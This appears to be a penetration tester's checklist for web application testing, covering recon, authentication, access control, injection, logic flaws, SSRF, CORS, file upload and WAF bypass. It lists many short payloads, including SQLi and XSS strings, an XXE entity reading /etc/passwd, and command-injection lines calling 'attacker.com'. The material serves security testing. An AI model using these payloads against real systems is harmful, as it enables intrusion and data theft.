---
title: Web Application Testing
tags:
  - methodology
  - pentest
  - web
aliases:
  - "/Methodology/Web-Applications"
  - "/methodology/web-applications/"
---
Structured approach to web application penetration testing. Ordered by signal strength -- test what's most likely to yield critical findings first, eliminate noise last.

## Testing Order

```
1. RECON         Endpoints, source maps, tech stack, signals
2. AUTH          Login, registration, session management, JWT, MFA
3. ACCESS        BAC, IDOR, privilege escalation, role matrix
4. INJECTION     SQLi, XSS, SSTI, command injection, XXE
5. LOGIC         Price manipulation, race conditions, state machines
6. INFRASTRUCTURE   SSRF, cache deception, API gateway bypass, CORS
```

Start at the top. Findings in one phase inform the next -- a weak JWT makes IDOR testing trivial, a user enumeration oracle makes brute force the priority.

---

## 1. Recon

- [ ] Enumerate endpoints (API routes, directories, hidden paths)
- [ ] If an API is `/api/v1/resource`, also fuzz `/api/FUZZ/resource` and `/api/v2/resource`
- [ ] Extract source maps -- frontend source reveals API routes, validation logic, roles
- [ ] Check robots.txt, sitemap.xml, .well-known/
- [ ] Identify tech stack from headers, error pages, JS bundles
- [ ] Check for WAF (`wafw00f`, or send `<script>` and observe response)
- [ ] Look for overexposed endpoints returning more data than the UI shows
- [ ] Check for different content types (.php, .html, .txt, .json, .xml)
- [ ] Review JS for hardcoded API keys, internal endpoints, debug flags

---

## 2. Authentication & Session

### Username Enumeration

- [ ] Different error messages ("user not found" vs "wrong password")
- [ ] Response time differences (known user triggers password hash comparison)
- [ ] Response length differences (even 1 byte matters)
- [ ] Registration endpoint reveals existing usernames
- [ ] Password reset reveals valid emails

### Brute Force

- [ ] Test rate limiting (does it exist? per-IP? per-account? per-session?)
- [ ] Header spoofing bypass: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP`
- [ ] Account lockout threshold and reset behaviour
- [ ] Credential stuffing with common passwords

### JWT

- [ ] Remove the token entirely -- does the request still work?
- [ ] Signature `"alg": "none"` attack
- [ ] Change payload claims (user ID, role, email)
- [ ] Crack signature with hashcat/jwt_tool (weak secrets)
- [ ] Algorithm confusion (RS256 -> HS256 with public key as secret)
- [ ] `kid` header injection (path traversal, SQLi)
- [ ] `jku`/`x5u` header pointing to attacker-controlled key
- [ ] Use low-privilege JWT for high-privilege actions
- [ ] Check token expiration -- does a revoked token still work?

### MFA

- [ ] Can the MFA step be skipped by navigating directly to the post-auth page?
- [ ] Is the MFA token brute-forceable (4-6 digits, no rate limit)?
- [ ] Does the MFA token work for different users?
- [ ] SQLi on the MFA verification parameter
- [ ] Response manipulation (change `"success": false` to `true`)

### Session Management

- [ ] Token entropy -- use Burp Sequencer or collect samples manually
- [ ] Are tokens predictable (sequential, timestamp-based, low entropy)?
- [ ] Session fixation -- can you set a session token before authentication?
- [ ] Does logout actually invalidate the token server-side?
- [ ] Cookie flags: HttpOnly, Secure, SameSite

### Password Reset

- [ ] Is the reset token predictable?
- [ ] Can you reset another user's password by changing the email/username parameter?
- [ ] Host header injection to capture reset links
- [ ] Does the reset token expire?
- [ ] Can you reuse a reset token?

---

## 3. Access Control

### Broken Access Control (BAC)

- [ ] Access admin pages directly (forceful browsing)
- [ ] Hidden admin paths: /admin, /administrator, /admin-panel, /management, /internal
- [ ] If /admin is protected, check /admin-roles, /admin-settings, /admin-users
- [ ] Change HTTP method (GET -> PUT/DELETE) on endpoints you can read but shouldn't write
- [ ] Remove authorization header entirely -- what still works?
- [ ] Use low-privilege token on high-privilege endpoints
- [ ] Check every endpoint with: no auth, user A token, user B token, admin token

### IDOR

- [ ] Identify all ID parameters (path, query, body)
- [ ] Change IDs to other users' resources
- [ ] Try sequential IDs (id=1, id=2, id=3)
- [ ] Try UUIDs from other users (leak via user profiles, comments, etc.)
- [ ] Test WRITE before READ -- can you PUT/PATCH/DELETE another user's resource?
- [ ] Check response bodies -- 200 with different data vs 200 with same data
- [ ] Contagion: if IDOR works on /users/:id, test /orders/:id, /invoices/:id

### Mass Assignment

- [ ] Find endpoints that accept JSON objects (registration, profile update, settings)
- [ ] Add fields from the response back into the request (role, isAdmin, verified, balance)
- [ ] Check for spread operators in source code (`Object.assign`, `...req.body`)
- [ ] Try nested objects: `{"user": {"role": "admin"}}`
- [ ] Compare request fields vs response fields -- extra response fields are candidates

---

## 4. Injection

### SQL Injection

- [ ] Test single quote `'` and double quote `"` in all parameters
- [ ] Test with and without URL encoding (`+` and `%20` are not the same)
- [ ] `ORDER BY 1` through `ORDER BY 20` to find column count
- [ ] `UNION SELECT null, null, ...` (match column count)
- [ ] `UNION SELECT 1, 2, 3, ...` to find visible columns
- [ ] Login bypass: `' OR 1=1-- -`, `admin'-- -`
- [ ] Blind boolean: `' AND 1=1-- -` vs `' AND 1=2-- -` (response diff)
- [ ] Blind time-based: `' AND SLEEP(5)-- -`
- [ ] Error-based: `' AND extractvalue(1, concat(0x7e, version()))-- -`
- [ ] Second-order: input stored then used in a later query
- [ ] Filter bypass: case variation, comments (`SEL/**/ECT`), double encoding

### NoSQL Injection

- [ ] Operator injection: `{"username": "admin", "password": {"$ne": ""}}`
- [ ] Query parameter: `?id[$ne]=null`, `?id[$gt]=""`
- [ ] Operators: `$eq`, `$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$regex`, `$exists`
- [ ] JavaScript injection: `$where: "this.password.match(/^a.*/)"`

### XSS

- [ ] Is input reflected in the response? Where? (HTML body, attribute, JS context, URL)
- [ ] Context-aware payloads:
  - HTML body: `<img src=x onerror=alert(1)>`
  - Attribute: `" onmouseover="alert(1)`
  - JavaScript: `';alert(1)//`
  - URL/href: `javascript:alert(1)`
- [ ] DOM sinks: innerHTML, document.write, eval -- use event handlers, NOT `<script>` tags
- [ ] Fuzz for allowed tags and attributes when filtering exists
- [ ] Stored XSS: input saved and rendered to other users
- [ ] Filter bypass: `<scrscriptipt>`, double encoding, unicode, HTML entities
- [ ] WAF bypass: payload padding (10,000+ chars before payload), case mixing
- [ ] `<base href>` injection to hijack relative URLs
- [ ] CSP bypass: check for unsafe-inline, wildcards, JSONP endpoints

### SSTI (Server-Side Template Injection)

- [ ] Test math expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
- [ ] If reflected as `49`, identify the engine (Jinja2, Twig, Freemarker, Velocity)
- [ ] Escalate to RCE based on engine
- [ ] Check response in proxy -- frontend may not render the result

### Command Injection

- [ ] Separators: `;`, `&&`, `||`, `|`, newline (`%0a`)
- [ ] Blind: `; ping -c 5 attacker.com`, `; curl attacker.com`
- [ ] Dangerous functions: exec(), system(), passthru() (PHP), child_process (Node.js)
- [ ] Bypass filters: `c$()at /etc/passwd`, variable substitution, wildcards

### XXE (XML External Entity)

- [ ] Any endpoint accepting XML, SVG, DOCX, XLSX
- [ ] Classic: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- [ ] Blind XXE with external DTD and out-of-band exfiltration
- [ ] XInclude attack (when you control only part of the XML)
- [ ] XXE -> SSRF: use entity to fetch internal URLs
- [ ] Content-type switching: change `application/json` to `application/xml`

---

## 5. Business Logic

### Price & Value Manipulation

- [ ] Change price, quantity, discount values in POST/PUT requests
- [ ] Negative quantities or negative prices
- [ ] Integer overflow (very large numbers)
- [ ] Apply discount codes multiple times (duplicate keys, arrays)
- [ ] Change currency while keeping amount
- [ ] Skip payment step entirely (navigate to confirmation)

### Race Conditions

- [ ] Multi-step processes: hammer step 2 before step 1 completes
- [ ] Duplicate actions: redeem, apply, confirm, transfer, vote
- [ ] Coupon/voucher/gift-card redemption
- [ ] Account balance operations (withdraw more than available)
- [ ] Single-packet attack: send 20-50 identical requests simultaneously
- [ ] Check for TOCTOU (time-of-check vs time-of-use) on any stateful operation

### State Machine Bypass

- [ ] Skip steps in multi-step workflows (go from step 1 to step 4)
- [ ] Replay earlier steps after later ones complete
- [ ] Change state values: `status=pending` -> `status=approved`
- [ ] Cancel after completion (refund after delivery)
- [ ] Re-enter a flow that should be one-time (verification, onboarding)

### Coupon/Discount Abuse

```json
// Duplicate keys
{"discount":"CODE-10", "discount":"CODE-10", "discount":"CODE-10"}

// Array injection
{"discount":["CODE-10","CODE-10","CODE-10","CODE-10","CODE-10"]}

// Apply to different items in same cart
// Apply expired codes, apply codes from other users
```

---

## 6. Infrastructure

### SSRF (Server-Side Request Forgery)

- [ ] Find URL-accepting parameters (webhooks, avatars, imports, PDF generators, link previews)
- [ ] Test localhost: `http://127.0.0.1`, `http://localhost`, `http://[::1]`
- [ ] Internal ranges: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`
- [ ] Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS)
- [ ] Alternative notation: decimal IP, hex IP, IPv6 mapped IPv4, DNS rebinding
- [ ] Redirect bypass: use your server that 302s to internal address
- [ ] Protocol switching: `file://`, `gopher://`, `dict://`
- [ ] Partial SSRF: can you scan internal ports via timing/error differences?

### CORS Misconfiguration

- [ ] Send request with `Origin: https://evil.com` -- is it reflected in `Access-Control-Allow-Origin`?
- [ ] Test `null` origin
- [ ] Test subdomain: `Origin: https://evil.target.com`
- [ ] Check if credentials are allowed (`Access-Control-Allow-Credentials: true`)
- [ ] If origin is reflected + credentials allowed = full account takeover via CORS

### Cache Deception

- [ ] Append static extension to authenticated page: `/api/me/profile.css`
- [ ] Path confusion: `/api/me/%2f..%2fstatic/style.css`
- [ ] Request authenticated page, check if `X-Cache: HIT` appears on second request
- [ ] If cached: access the same URL without authentication -- does it return cached authenticated content?

### API Gateway Bypass

- [ ] Path traversal: `/public/../admin/users`
- [ ] Method override: `X-HTTP-Method-Override: DELETE` with a GET request
- [ ] Version rollback: `/api/v1/admin` might have weaker controls than `/api/v2/admin`
- [ ] Case sensitivity: `/Admin/Users` vs `/admin/users`
- [ ] Trailing characters: `/admin/users..;/`, `/admin/users%00`
- [ ] Double URL encoding: `%252e%252e%252f`

### File Upload

- [ ] Extension bypass: `.phtml`, `.php5`, `.pHp`, `.php.jpg`
- [ ] Double extension: `.jpg.php`
- [ ] Content-type mismatch: change header but keep malicious content
- [ ] Null byte: `file.php%00.jpg`
- [ ] Malicious content in allowed formats (XXE in SVG/DOCX, EXIF data in images)
- [ ] Path traversal in filename: `../../../etc/cron.d/shell`
- [ ] Are uploaded files accessible via URL? Can other users access them?

### Open Redirect

- [ ] Check URL parameters: `?redirect=`, `?next=`, `?url=`, `?return=`
- [ ] Frontend: `location.href`, `window.location`, `document.location` with user input
- [ ] Bypass filters: `//evil.com`, `\/\/evil.com`, `https://target.com@evil.com`
- [ ] Use for: phishing, OAuth token theft, SSRF chain

### CSRF

- [ ] State-changing requests without CSRF token
- [ ] Token present but not validated (random value accepted)
- [ ] Token tied to session? (swap between users)
- [ ] GET method accepted for state-changing actions (CSRF via image tag)
- [ ] SameSite cookie attribute (None = vulnerable, Lax/Strict = harder)

### WebSocket

- [ ] Check for `Upgrade: WebSocket` in responses
- [ ] Cross-Site WebSocket Hijacking (CSWSH):
  - Handshake relies on cookies only (no CSRF token)
  - SameSite=None on session cookie
- [ ] Message injection / manipulation
- [ ] Check if authentication is validated on each message or just on connect

### Prototype Pollution

- [ ] JSON body: `{"__proto__": {"isAdmin": true}}`
- [ ] Query string: `?__proto__[isAdmin]=true`
- [ ] Constructor: `{"constructor": {"prototype": {"isAdmin": true}}}`
- [ ] Filter bypass: `__pro__proto__to__`
- [ ] Look for sinks: `eval()`, `document.createElement()`, `innerHTML`, `Object.assign()`
- [ ] Server-side: use Burp extension or test for property reflection in responses
- [ ] DOM-based: use DOM Invader in Burp's embedded browser

### GraphQL

- [ ] Introspection: `{__schema{types{name,fields{name}}}}`
- [ ] If introspection disabled: field suggestion, field stuffing, error-based discovery
- [ ] Batch queries: send multiple operations in one request
- [ ] Depth/complexity attacks (nested queries for DoS)
- [ ] Mutation discovery: fuzz for hidden mutations
- [ ] Alias-based brute force (multiple queries in one request)
- [ ] Standard web vulns still apply: injection, IDOR, BAC on all fields

---

## WAF Bypass Techniques

When a WAF blocks your payload:

- [ ] Payload padding: 10,000+ characters before the actual payload
- [ ] Encoding: double URL encoding, unicode, HTML entities, hex
- [ ] Case mixing: `SeLeCt`, `<ScRiPt>`
- [ ] Comment insertion: `SEL/**/ECT`, `UN/**/ION`
- [ ] HTTP parameter pollution: same param multiple times
- [ ] Content-type switching: `application/json` to `application/x-www-form-urlencoded`
- [ ] Chunked transfer encoding
- [ ] After 3 failed bypass attempts on the same endpoint: move on. Don't rabbit-hole.
